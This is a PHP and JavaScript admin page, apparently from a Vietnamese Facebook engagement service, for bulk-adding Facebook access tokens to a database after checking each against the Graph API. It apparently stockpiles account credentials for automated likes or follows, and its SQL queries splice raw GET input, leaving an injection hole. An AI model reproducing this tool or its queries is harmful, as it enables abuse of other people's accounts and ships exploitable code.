<?php
session_start();
include ("../../../config.php");
if(isset($_GET['token'])){
	$token = $_GET['token'];
	$loai = $_GET['loai'];
	$me = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
	if(isset($me['id']) && !preg_match('|@tfbnw.net|',$me['email'])){
		 if($loai == 6){
			if(mysqli_num_rows(mysqli_query($kunloc,"SELECT * FROM token WHERE token = '".$token."' AND loai = '6'"))) {
			    $total = mysqli_num_rows(mysqli_query($kunloc,"SELECT id FROM token WHERE  loai = '6'"));
			    mysqli_query($kunloc,"UPDATE token SET idfb = '".$me['id']."' WHERE idfb = '".$me['id']."' ,token = '".$token."' WHERE token = '".$token."'");
				$echo['trangthai'] = 'update';
				$echo['total'] = $total;
				ECHO json_encode($echo,JSON_UNESCAPED_UNICODE);
			}else{
			    $total = mysqli_num_rows(mysqli_query($kunloc,"SELECT id FROM token WHERE  loai = '6'"));
			    mysqli_query($kunloc,"INSERT INTO token SET idfb = '".$me['id']."',token = '".$token."',loai = '6'");
				$echo['trangthai'] = 'insert';
				$echo['total'] = $total;
				ECHO json_encode($echo,JSON_UNESCAPED_UNICODE);
			}
		}
		if($loai == 7){
			if(mysqli_num_rows(mysqli_query($kunloc,"SELECT * FROM token WHERE token = '".$token."' AND loai = '7'"))) {
			    $total = mysqli_num_rows(mysqli_query($kunloc,"SELECT id FROM token WHERE  loai = '7'"));
		        mysqli_query($kunloc,"UPDATE token SET idfb = '".$me['id']."' WHERE idfb = '".$me['id']."' ,token = '".$token."' WHERE token = '".$token."'");
		        $echo['trangthai'] = 'update';
				$echo['total'] = $total;
				ECHO json_encode($echo,JSON_UNESCAPED_UNICODE);
			}else{
			    $total = mysqli_num_rows(mysqli_query($kunloc,"SELECT id FROM token WHERE  loai = '7'"));
			    mysqli_query($kunloc,"INSERT INTO token SET idfb = '".$me['id']."',token = '".$token."',loai = '7'");
				$echo['trangthai'] = 'insert';
				$echo['total'] = $total;
				ECHO json_encode($echo,JSON_UNESCAPED_UNICODE);
			}
		}
		if($loai == 8){
			if(mysqli_num_rows(mysqli_query($kunloc,"SELECT * FROM token WHERE token = '".$token."' AND loai = '8'"))) {
			    $total = mysqli_num_rows(mysqli_query($kunloc,"SELECT id FROM token WHERE  loai = '8'"));
			    mysqli_query($kunloc,"UPDATE token SET idfb = '".$me['id']."' WHERE idfb = '".$me['id']."' ,token = '".$token."' WHERE token = '".$token."'");
			    $echo['trangthai'] = 'update';
				$echo['total'] = $total;
				ECHO json_encode($echo,JSON_UNESCAPED_UNICODE);
			}else{
			    $total = mysqli_num_rows(mysqli_query($kunloc,"SELECT id FROM token WHERE  loai = '8'"));
			    mysqli_query($kunloc,"INSERT INTO token SET idfb = '".$me['id']."',token = '".$token."',loai = '8'");
				$echo['trangthai'] = 'insert';
				$echo['total'] = $total;
				ECHO json_encode($echo,JSON_UNESCAPED_UNICODE);
			}
		}
		
	}else{
	    $echo['trangthai'] = 'die';
		$echo['total'] = $total;
		ECHO json_encode($echo,JSON_UNESCAPED_UNICODE);
	}
	exit();
}
function auto($url){
$data = curl_init();
curl_setopt($data, CURLOPT_RETURNTRANSFER,1);
curl_setopt($data, CURLOPT_URL, $url);
$hasil = curl_exec($data);
curl_close($data);
return $hasil;
}
?>
<?php include ("../../../main/head.php"); if($username == $admin){ ?>
<body>
<div id="wrapper" class="wrapper" style="padding-top:30px">
    <div class="container">
         <div class="col-md-13">
          <div class="card">
            <div class="card-header text-uppercase text-center"><i class="fa">&#xf11c;</i> Thêm Token - Kunloc <span style="color:red" id="total">0</span></div>
                <div class="card-body"> 
                <!-- /./ -->
				<div class="form-group">
					<textarea style="height:200px" class="custom-select" id="listtoken"  placeholder="Nhập token tại đây..."></textarea>
					</div>
					<!-- /./ -->
					<div class="form-group has-error has-feedback">
                        <select id="loai" class="custom-select">
                			<option value="6">Token Sub Random</option>
                			<option value="7">Token Noveri  </option>
                			<option value="8">Token Veri </option>
        		        </select>
                    </div>
                    <!-- /./ -->
		        	<div class="form-group">
						<button type="button" class="btn-xs btn-dark btn-radius" id="submit" onclick="addtoken();">BẮT ĐẦU THÊM TOKEN...</button>
					</div>
					<!-- /./ -->	
    					<div id="trangthai" style= 'display:none'>
    					Số Trùng :<div id="update" style="color:red">0</div>
    					Số Thêm :<div id="insert" style="color:red">0</div>
    					Số Chết :<div id="die" style="color:red">0</div>
    					</div>
    				<!-- /./ -->	
                </div>
            </div>
        </div>
<script type="text/javascript">
    function addtoken() {
		var insert = 0, update = 0, die = 0;
        var listtoken = $('#listtoken').val();
		var loai = $('#loai').val();
        if (listtoken == '') {
            swal("Yêu cầu","Còn thiếu gì đó!","error");
            return false;
        }
		$('#trangthai').show();
		$('#submit').prop('disabled', true).html('<i class="fa fa-spinner fa-spin"></i> Đang xử lí..');
		var tach_token = listtoken.split('\n');
		var total = tach_token.length;
		for(i = 0; i < total; i++){
		var token = tach_token[i].trim();
        $.get('Addtoken', { token: token, loai:loai }, function(data, status) {
        			var Data = JSON.parse(data);
        			if(Data.trangthai == 'die'){
            			die++;
            			$('#die').text(die);
            			$('#total').text(Data.total);
        			}
        			if(Data.trangthai == 'insert'){
            			insert++;
            			$('#insert').text(insert);
            			$('#total').text(Data.total);
        			}
        			if(Data.trangthai == 'update'){
        				update++;
        				$('#update').text(update);
        				$('#total').text(Data.total);
        			}
                $('#submit').prop('disabled', false).html('Hoàn thành');
                }).fail(function(){
        	        swal("Yêu cầu","Nạp thất bại!","error");
                    $('#submit').prop('disabled', false).html('Hoàn thành');
        	    });
        	}
    }
</script>
<?php }else{ echo "<script>alert('Trang bạn truy cập không tồn tại'); setTimeout(function(){ window.location  = '".$domain."/Home'; }, 0);</script>";  } ?>
</body>
</html>